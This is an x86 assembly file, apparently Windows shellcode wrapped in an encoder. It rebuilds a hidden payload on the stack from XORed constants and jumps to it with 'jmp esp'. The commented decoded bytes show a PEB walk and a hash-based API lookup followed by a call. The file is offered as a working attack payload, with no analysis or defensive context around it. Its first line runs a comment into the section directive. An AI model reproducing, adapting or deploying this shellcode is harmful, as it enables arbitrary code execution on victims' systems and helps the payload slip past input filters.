; x86 encoded shellcodesection .text

global _start
_start:
    pushad
register:
    push 0x21
    pop eax
    xor al , 0x21
    dec eax
    push eax
    xor al, 0x2f
    push eax
    pop esi
    pop ecx
    push esp
    pop ebx
encode:
; push 0xF9EB9090
    push ecx
    pop eax
    xor eax, 0x3857373e
    xor eax, 0x3e435851
    push eax
; push 0x585AC361
    push 0x702c492e
    pop eax
    xor eax, 0x2876754f
    push eax
    xor [esp + esi + 0x31], cl
; push 0xE38B9D61
    push ecx
    pop eax
    xor eax, 0x24454953
    xor eax, 0x38312b32
    push eax
    xor [esp + esi + 0x30], cl
; push 0xD2FF500A
    push 0x66773624
    pop eax
    xor eax, 0x4b77662e
    push eax
    xor [esp + esi + 0x32], cx
; push 0x6AE08921
    push 0x4b35216f
    pop eax
    xor eax, 0x212a574e
    push eax
    xor [esp + esi + 0x31], cx
; push 0x21212124
    push 0x65437c66
    pop eax
    xor eax, 0x44625d42
    push eax
; push 0x2C81848D
    push ecx
    pop eax
    xor eax, 0x66584d33
    xor eax, 0x4a263641
    push eax
    xor [esp + esi + 0x33], cl
; push 0x82846821
    push 0x574a3074
    pop eax
    xor eax, 0x2a315855
    push eax
    xor [esp + esi + 0x32], cx
; push 0x21212124
    push 0x785d765d
    pop eax
    xor eax, 0x597c5779
    push eax
; push 0x2C812121
    push 0x7d435a77
    pop eax
    xor eax, 0x513d7b56
    push eax
    xor [esp + esi + 0x32], cl
; push 0x212168DA
    push 0x43593150
    pop eax
    xor eax, 0x62785975
    push eax
    xor [esp + esi + 0x30], cl
; push 0x0188148B
    push 0x313b453f
    pop eax
    xor eax, 0x304c514b
    push eax
    xor [esp + esi + 0x30], cl
    xor [esp + esi + 0x32], cl
; push 0x4A0C8B66
    push 0x3854352e
    pop eax
    xor eax, 0x72584148
    push eax
    xor [esp + esi + 0x31], cl
; push 0x585AE075
    push 0x29776944
    pop eax
    xor eax, 0x712d7631
    push eax
    xor [esp + esi + 0x31], cl
; push 0x3C3E6889
    push 0x71662a2d
    pop eax
    xor eax, 0x4d58425b
    push eax
    xor [esp + esi + 0x30], cl
; push 0xFA81F4EB
    push ecx
    pop eax
    xor eax, 0x2d2b254f
    xor eax, 0x28552e5b
    push eax
; push 0xC20111CA
    push ecx
    pop eax
    xor eax, 0x48302541
    xor eax, 0x75313474
    push eax
    xor [esp + esi + 0x31], cx
; push 0xC10774C0
    push ecx
    pop eax
    xor eax, 0x6e423e48
    xor eax, 0x50454a77
    push eax
    xor [esp + esi + 0x31], cx
; push 0x84ACD231
    push ecx
    pop eax
    xor eax, 0x492d5d7b
    xor eax, 0x327e704a
    push eax
    xor [esp + esi + 0x30], cl
; push 0xC031DE01
    push 0x636e5949
    pop eax
    xor eax, 0x5c5f7848
    push eax
    xor [esp + esi + 0x31], cl
    xor [esp + esi + 0x33], cl
; push 0x8F348B49
    push 0x454f5c3f
    pop eax
    xor eax, 0x357b2876
    push eax
    xor [esp + esi + 0x31], cl
    xor [esp + esi + 0x33], cl
; push 0x4BE352DA
    push 0x32442e4d
    pop eax
    xor eax, 0x79587c68
    push eax
    xor [esp + esi + 0x30], cl
    xor [esp + esi + 0x32], cl
; push 0x0124528B
    push 0x414c3f5f
    pop eax
    xor eax, 0x40686d2b
    push eax
    xor [esp + esi + 0x30], cl
; push 0xDF01207A
    push 0x6a447953
    pop eax
    xor eax, 0x4a455929
    push eax
    xor [esp + esi + 0x33], cl
; push 0x8B50D801
    push 0x412b6570
    pop eax
    xor eax, 0x357b4271
    push eax
    xor [esp + esi + 0x31], cl
    xor [esp + esi + 0x33], cl
; push 0x1C428B14
    push 0x7475526f
    pop eax
    xor eax, 0x6837267b
    push eax
    xor [esp + esi + 0x31], cl
; push 0x4A8BDA01
    push 0x7c4b623a
    pop eax
    xor eax, 0x363f473b
    push eax
    xor [esp + esi + 0x31], cx
; push 0x781A548B
    push 0x342b6d38
    pop eax
    xor eax, 0x4c31394c
    push eax
    xor [esp + esi + 0x30], cl
; push 0x3C538B10
    push 0x767d2558
    pop eax
    xor eax, 0x4a2e5148
    push eax
    xor [esp + esi + 0x31], cl
; push 0x5B8B1B8B
    push 0x27295e3f
    pop eax
    xor eax, 0x7c5d454b
    push eax
    xor [esp + esi + 0x30], cl
    xor [esp + esi + 0x32], cl
; push 0x1B8B145B
    push 0x7e5d3377
    pop eax
    xor eax, 0x6529272c
    push eax
    xor [esp + esi + 0x32], cl
; push 0x8B0C5B8B
    push ecx
    pop eax
    xor eax, 0x314e7939
    xor eax, 0x4542224d
    push eax
    xor [esp + esi + 0x31], cx
; push 0x305B8B64
    push 0x4c2a4852
    pop eax
    xor eax, 0x7c713c36
    push eax
    xor [esp + esi + 0x31], cl
; push 0xDB319C60
    push 0x7c6b3e44
    pop eax
    xor eax, 0x585a5d24
    push eax
    xor [esp + esi + 0x31], cl
    xor [esp + esi + 0x33], cl
; jmp to shellcode
to_shellcode:
    jmp esp
